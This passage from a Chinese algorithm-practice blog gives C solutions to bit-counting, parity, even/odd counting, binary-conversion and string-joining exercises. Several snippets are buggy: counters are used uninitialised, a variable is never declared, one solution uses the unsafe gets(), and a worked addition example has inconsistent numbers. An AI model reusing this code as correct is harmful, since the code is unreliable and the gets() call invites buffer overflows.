<td style="text-align:center">1000</td>
<td style="text-align:center">count[8] = 1</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">1001</td>
<td style="text-align:center">count[9] = 2 = count[8] + count[1]</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">1010</td>
<td style="text-align:center">count[10] = 2 = count[8] + count[2]</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">1011</td>
<td style="text-align:center">count[11] = 3 = count[8] + count[3]</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">1100</td>
<td style="text-align:center">count[12] = 2 = count[8] + count[4]</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">1101</td>
<td style="text-align:center">count[13] = 3 = count[8] + count[5]</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">1110</td>
<td style="text-align:center">count[14] = 3 = count[8] + count[6]</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:center">1111</td>
<td style="text-align:center">count[15] = 4 = count[8] + count[7]</td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td style="text-align:center">10000</td>
<td style="text-align:center">count[16] = 1</td>
</tr>
</tbody>
</table>
<p>观察得：</p>
<p>在n&gt;3之后有如下规律：</p>
<p>i&gt;2时，2的i次方中1的个数为1，例如，4，8，16；</p>
<p>count[pow(2,i)] = 1；</p>
<p>4-8,8-16这些区间中的数的1的个数都可以拆分成两个数的1的个数的和。</p>
<p>count[pow(2,i) + j] = count[pow(2,i)] + count[j]，其中j在区间[1,pow(2,i)-1]</p>
<h5 id="leetcode-AC的结果（C语言）"><a href="#leetcode-AC的结果（C语言）" class="headerlink" title="leetcode AC的结果（C语言）"></a>leetcode AC的结果（C语言）</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * Return an array of size *returnSize.</div><div class="line"> * Note: The returned array must be malloced, assume caller calls free().</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">int</span>* <span class="title">countBits</span><span class="params">(<span class="keyword">int</span> num, <span class="keyword">int</span>* returnSize)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">int</span> m;</div><div class="line">    <span class="keyword">int</span> *p;</div><div class="line">    *returnSize = ++num;</div><div class="line">    p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(num));   <span class="comment">//动态分配内存</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span>(num == <span class="number">0</span>)    <span class="comment">//num等于0时数组的值</span></div><div class="line">    &#123;</div><div class="line">        p[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num == <span class="number">1</span>)  <span class="comment">//num等于1时数组的值</span></div><div class="line">    &#123;</div><div class="line">        p[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">        p[<span class="number">1</span>] = <span class="number">1</span>;</div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num == <span class="number">2</span>)  <span class="comment">//num等于2时数组的值</span></div><div class="line">    &#123;</div><div class="line">        p[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">        p[<span class="number">1</span>] = <span class="number">1</span>;</div><div class="line">        p[<span class="number">2</span>] = <span class="number">1</span>;</div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num == <span class="number">3</span>)  <span class="comment">//num等于3时数组的值</span></div><div class="line">    &#123;</div><div class="line">        p[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">        p[<span class="number">1</span>] = <span class="number">1</span>;</div><div class="line">        p[<span class="number">2</span>] = <span class="number">1</span>;</div><div class="line">        p[<span class="number">3</span>] = <span class="number">2</span>;</div><div class="line">    &#125;<span class="keyword">else</span>   <span class="comment">//得到num大于4的情况下的数组的值（即1的个数）</span></div><div class="line">    &#123;</div><div class="line">        p[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">        p[<span class="number">1</span>] = <span class="number">1</span>;</div><div class="line">        p[<span class="number">2</span>] = <span class="number">1</span>;</div><div class="line">        p[<span class="number">3</span>] = <span class="number">2</span>;</div><div class="line">        i=<span class="number">2</span>;</div><div class="line">        m = <span class="built_in">pow</span>(<span class="number">2</span>,i);</div><div class="line">        <span class="keyword">while</span>(m&lt;num)&#123;</div><div class="line">            p[m] = <span class="number">1</span>;</div><div class="line">            <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;m;j++)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">if</span>(m+j&gt;=num)</div><div class="line">                    <span class="keyword">return</span> p;</div><div class="line">                p[m+j] = p[m] + p[j];</div><div class="line">            &#125;</div><div class="line">            i++;</div><div class="line">            m = <span class="built_in">pow</span>(<span class="number">2</span>,i);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> p;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>AC之后去看了关于这道题的讨论，其实，自己把问题想的太复杂了，感觉还是智商不够用啊，看看别人的代码，长长见识：</p>
<p><strong>解法一：</strong></p>
<p>从1开始，遇到偶数时，其1的个数和该偶数除以2得到的数字的1的个数相同，遇到奇数时，其1的个数等于该奇数除以2得到的数字的1的个数再加1。</p>
<h5 id="解法一C语言实现"><a href="#解法一C语言实现" class="headerlink" title="解法一C语言实现"></a>解法一C语言实现</h5><p>注：这是可直接运行的代码，并没有按leetcode的格式提交。<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i,n;</div><div class="line">    <span class="keyword">int</span> *p;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(++n));   <span class="comment">//动态分配内存</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span>(n == <span class="number">1</span>)</div><div class="line">        p[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        p[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;n;i++)    <span class="comment">//得到1的个数</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(i%<span class="number">2</span> == <span class="number">0</span>)</div><div class="line">                p[i] = p[i/<span class="number">2</span>];</div><div class="line">            <span class="keyword">else</span></div><div class="line">                p[i] = p[i/<span class="number">2</span>] + <span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,p[i]);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><strong>解法二：</strong></p>
<p>利用此规律：每个i中1的个数都是i&amp;(i-1)中1的个数的值加1</p>
<h5 id="解法二C语言实现"><a href="#解法二C语言实现" class="headerlink" title="解法二C语言实现"></a>解法二C语言实现</h5><p>注：这是可直接运行的代码，并没有按leetcode的格式提交。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i,n;</div><div class="line">    <span class="keyword">int</span> *p;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(++n));   <span class="comment">//动态分配内存</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span>(n == <span class="number">1</span>)</div><div class="line">        p[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        p[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;n;i++)</div><div class="line">            p[i] = p[i&amp;(i<span class="number">-1</span>)] + <span class="number">1</span>;  <span class="comment">//得到1的个数</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,p[i]);     <span class="comment">//输出数组</span></div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="奇偶校验"><a href="#奇偶校验" class="headerlink" title="奇偶校验"></a>奇偶校验</h4><p>华科2010年研究生复试机试题</p>
<h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>输入一个字符串，然后对每个字符进行奇校验，最后输出校验后的二进制数(如’3’，输出：10110011)。</p>
<p>输入：<br>输入包括一个字符串，字符串长度不超过100。</p>
<p>输出：<br>可能有多组测试数据，对于每组数据，<br>对于字符串中的每一个字符，输出按题目进行奇偶校验后的数，每个字符校验的结果占一行。</p>
<p>样例输入：</p>
<p>3</p>
<p>3a</p>
<p>样例输出：</p>
<p>10110011</p>
<p>10110011</p>
<p>01100001</p>
<h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>先判断该字符的ASCLL码对应的二进制表示中1的个数是奇数还是偶数，如果是奇数则将该字符的ASCLL码对应的二进制表示的各个位直接输出，如果是偶数则先将最高位或上1，使其中1的个数为奇数个，再将该字符的ASCLL码对应的二进制表示的各个位输出。</p>
<h5 id="C语言实现"><a href="#C语言实现" class="headerlink" title="C语言实现"></a>C语言实现</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">oddCheck</span><span class="params">(<span class="keyword">char</span> c)</span>    <span class="comment">//判断二进制表示中1的个数为奇数个还是偶数个</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> count,i;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(c&amp;(<span class="number">1</span>&lt;&lt;i))</div><div class="line">        count++;    <span class="comment">//计数</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>((count%<span class="number">2</span>) == <span class="number">0</span>)  </div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;   </div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;   </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> len,i,j;</div><div class="line">    <span class="keyword">char</span> a[<span class="number">100</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,a[<span class="number">0</span>]);</div><div class="line">    len = <span class="built_in">strlen</span>(a);</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(oddCheck(a[i]))</div><div class="line">            a[i] = a[i] | (<span class="number">1</span>&lt;&lt;<span class="number">7</span>);   <span class="comment">//如果1的个数为偶数个，则将最高位置为1</span></div><div class="line">        <span class="keyword">for</span>(j=<span class="number">7</span>;j&gt;=<span class="number">0</span>;j--)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(a[i]&amp;(<span class="number">1</span>&lt;&lt;j))     <span class="comment">//按顺序输出各个位</span></div><div class="line">                <span class="built_in">printf</span>(<span class="string">"1"</span>);</div><div class="line">            <span class="keyword">else</span></div><div class="line">                <span class="built_in">printf</span>(<span class="string">"0"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;       </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="比较奇偶数个数"><a href="#比较奇偶数个数" class="headerlink" title="比较奇偶数个数"></a>比较奇偶数个数</h4><p>北邮2010年研究生复试机试题</p>
<h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>第一行输入一个数，为n，第二行输入n个数，这n个数中，如果偶数比奇数多，输出NO，否则输出YES。</p>
<p>输入：<br>输入有多组数据。<br>每组输入n，然后输入n个整数（1&lt;=n&lt;=1000）。</p>
<p>输出：<br>如果偶数比奇数多，输出NO，否则输出YES。</p>
<p>样例输入：</p>
<p>5</p>
<p>1 5 2 4 3</p>
<p>样例输出：</p>
<p>YES</p>
<h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>通过对2取余来判断这个数是奇数还是偶数，并进行计数，最后比较奇偶计数的大小得到结果进行输出。</p>
<h5 id="C语言实现-1"><a href="#C语言实现-1" class="headerlink" title="C语言实现"></a>C语言实现</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> even,odd,n,i;</div><div class="line">    <span class="keyword">int</span> *p;</div><div class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d\n"</span>,&amp;n) != EOF)</div><div class="line">    &#123;</div><div class="line">        p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*n);</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;p[i]);  </div><div class="line">            <span class="keyword">if</span>(p[i]%<span class="number">2</span> == <span class="number">0</span>)</div><div class="line">                even++;     <span class="comment">//偶数计数</span></div><div class="line">            <span class="keyword">else</span></div><div class="line">                odd++;      <span class="comment">//奇数计数</span></div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(even &gt; odd)</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"NO\n"</span>);</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"YES\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>算法学习</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习-刷题(一)</title>
    <url>/2016/08/10/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%B8%80/</url>
    <content><![CDATA[<p>　　在知乎上看到别人分享算法学习之路，确实有很多的经验值得借鉴，其中LeetCode在线判题平台汇集了很多名企的笔试面试算法题，还有牛客网等网站都有不错的算法习题资源，所以打算要坚持刷一刷题。</p>
<p>　　因为不是纯粹为了刷题而刷题，而是为了学习和练习算法，需要总结，所以就把刷过的题都写进了博客，同时也算是将自己做题的一些过程进行分享。</p>
<a id="more"></a>
<h4 id="Sum-of-Two-Integers"><a href="#Sum-of-Two-Integers" class="headerlink" title="Sum of Two Integers"></a>Sum of Two Integers</h4><p>LeetCode第371题</p>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>Calculate the sum of two integers a and b, but you are not allowed to use the operator + and -.</p>
<p>Example:</p>
<p>Given a = 1 and b = 2, return 3.</p>
<h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">题目要求不能使用加减号，于是想到使用按位操作来进行解题。先将十进制数转换成二进制数观察规律，综合考虑如下情况：</div><div class="line"></div><div class="line">1、没有进位的情况</div><div class="line">10 + 5 = 15 即二进制的：1111</div><div class="line">使用异或运算可得到此结果：</div><div class="line">a = 10; b = 5;</div><div class="line">转换成二进制为：a = 1010 b = 0101</div><div class="line">a^b = 1111</div><div class="line"></div><div class="line">2、有进位的情况</div><div class="line">20 + 25 = 45 即二进制的：101101</div><div class="line">使用异或运算:</div><div class="line">a = 10100   b = 11001</div><div class="line">a^b = 01101   此结果没有进位</div><div class="line">要想得到结果，需将a^b的结果与a&amp;b然后左移一位的结果进行异或</div><div class="line">a&amp;b = 10000 a^b = 01101</div><div class="line">(a^b)^((a&amp;b)&lt;&lt;1) 即01101^100000 = 101101</div><div class="line"></div><div class="line">综合考虑，每次都需判断a&amp;b是否为0，如果不为0则需要将a^b的结果与a&amp;b然后左移一位的结果进行异或，直到a&amp;b的结果为0，即不再有进位时，才输出结果。</div><div class="line"></div><div class="line">例如：</div><div class="line">a = 10 b =10 a+b = 14  即二进制的：11000</div><div class="line">第一次：</div><div class="line">a=1010   b=1110    </div><div class="line">a&amp;b = 1010 不为0</div><div class="line">a^b = 0100</div><div class="line">第二次：</div><div class="line">a = 1010&lt;&lt;1  b = 0100</div><div class="line">a&amp;b = 00100 不为0</div><div class="line">a^b = 10000</div><div class="line">第三次：</div><div class="line">a = 001000   b = 10000</div><div class="line">a&amp;b = 00000</div><div class="line">a^b = 11000 即24</div></pre></td></tr></table></figure>
<h5 id="C语言实现"><a href="#C语言实现" class="headerlink" title="C语言实现"></a>C语言实现</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> carry,result;</div><div class="line">    carry = a&amp;b;</div><div class="line">    result = a^b;</div><div class="line">    <span class="keyword">if</span>(carry)</div><div class="line">    &#123;       </div><div class="line">        <span class="keyword">return</span> getSum(carry&lt;&lt;<span class="number">1</span>,result);</div><div class="line">    &#125;<span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> a,b,m;</div><div class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;a,&amp;b) != EOF)</div><div class="line">    &#123;   </div><div class="line">        m = getSum(a,b);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,m);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="二进制数"><a href="#二进制数" class="headerlink" title="二进制数"></a>二进制数</h4><p>北邮2012年研究生复试机试题</p>
<h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>大家都知道，数据在计算机里中存储是以二进制的形式存储的。有一天，小明学了C语言之后，他想知道一个类型为unsigned int 类型的数字，存储在计算机中的二进制串是什么样子的。<br>你能帮帮小明吗？并且，小明不想要二进制串中前面的没有意义的0串，即要去掉前导0。</p>
<p>输入：</p>
<p>第一行，一个数字T（T&lt;=1000），表示下面要求的数字的个数。<br>接下来有T行，每行有一个数字n（0&lt;=n&lt;=10^8），表示要求的二进制串。</p>
<p>输出：</p>
<p>输出共T行。每行输出求得的二进制串。</p>
<p>样例输入：</p>
<p>5</p>
<p>23</p>
<p>535</p>
<p>2624</p>
<p>56275</p>
<p>989835</p>
<p>样例输出：</p>
<p>10111</p>
<p>1000010111</p>
<p>101001000000</p>
<p>1101101111010011</p>
<p>11110001101010001011</p>
<h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">十进制数转二进制，很快就应该想到使用除二取余来解决问题，举个例子来分析一下：</div><div class="line"></div><div class="line">11/2 = 5 ---1</div><div class="line">5/2 = 2 ---1</div><div class="line">2/2 = 1 ---0</div><div class="line">1/2 = 0 ---1</div><div class="line"></div><div class="line">结果为：1011，分析结果可知，先得到的余数在结果字符串的后面，即先得到的位后输出，后得到的位先输出，这不就是栈的后进先出特点吗？</div><div class="line"></div><div class="line">因此，我们使用除二取余的办法将得到的各个余数压入栈中，待除二的结果为0时，再将栈中的各位弹出，即可得到二进制串。</div></pre></td></tr></table></figure>
<p><strong>C语言实现：</strong><br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> top;</div><div class="line">    <span class="keyword">int</span> data[<span class="number">100</span>];</div><div class="line">&#125;<span class="built_in">stack</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">convert_to_binary</span><span class="params">(<span class="built_in">stack</span> *s, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> d)</span></span></div><div class="line">&#123;</div><div class="line">    s-&gt;top = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (d) &#123;</div><div class="line">        s-&gt;data[s-&gt;top ++] = d % <span class="number">2</span>;</div><div class="line">        d /= <span class="number">2</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (s-&gt;top) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>, s-&gt;data[-- s-&gt;top]);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i, n;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> d;</div><div class="line">    <span class="built_in">stack</span> *s = (<span class="built_in">stack</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">stack</span>));</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n) != EOF) &#123;</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i ++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;m);</div><div class="line">            <span class="keyword">if</span> (m != <span class="number">0</span>) &#123;</div><div class="line">                convert_to_binary(s, m);</div><div class="line">            &#125;<span class="keyword">else</span> &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"0\n"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h4><p>华科2010年研究生复试机试题</p>
<h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>不借用任何字符串库函数实现无冗余地接受两个字符串，然后把它们无冗余的连接起来。</p>
<p>输入：<br>每一行包括两个字符串，长度不超过100。</p>
<p>输出：<br>可能有多组测试数据，对于每组数据，<br>不借用任何字符串库函数实现无冗余地接受两个字符串，然后把它们无冗余的连接起来。<br>输出连接后的字符串。</p>
<p>样例输入：</p>
<p>abc def</p>
<p>样例输出：</p>
<p>abcdef</p>
<h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p><strong>方案一：</strong></p>
<p>开辟三个字符数组，使用循环遍历数组并将第二个数组的字符复制给第一个数组，再复制第三个数组到第一个数组。</p>
<h5 id="方案一C语言实现"><a href="#方案一C语言实现" class="headerlink" title="方案一C语言实现"></a>方案一C语言实现</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">contact</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">char</span> *str1, <span class="keyword">char</span> *str2)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;str1[i]!=<span class="string">'\0'</span>;i++)</div><div class="line">    &#123;</div><div class="line">        str[i]=str1[i];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;str2[j]!=<span class="string">'\0'</span>;j++)</div><div class="line">    &#123;</div><div class="line">        str[i+j]=str2[j];</div><div class="line">    &#125;</div><div class="line">    str[i+j]=<span class="string">'\0'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> str[<span class="number">202</span>],str1[<span class="number">101</span>],str2[<span class="number">101</span>];</div><div class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%s%s"</span>,str1,str2) != EOF)</div><div class="line">    &#123;</div><div class="line">        contact(str, str1, str2);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,str);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>方案二：</strong></p>
<p>其实呢，这个题是可以取巧的，有没有发现输入是在一行，我们只要把这一行输入直接看成一个字符串，然后把除空格之外的其他字符全部输出不就好了？</p>
<h5 id="方案二C语言实现"><a href="#方案二C语言实现" class="headerlink" title="方案二C语言实现"></a>方案二C语言实现</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;   </div><div class="line">    <span class="keyword">char</span> a[<span class="number">202</span>];</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">while</span>(gets(a)!=<span class="string">'\0'</span>)</div><div class="line">    &#123;</div><div class="line">        i=<span class="number">0</span>;    </div><div class="line">        <span class="keyword">while</span>(a[i]!=<span class="string">'\0'</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(a[i]!=<span class="string">' '</span>)</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,a[i]);</div><div class="line">            i++;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>另外的思考：</strong></p>
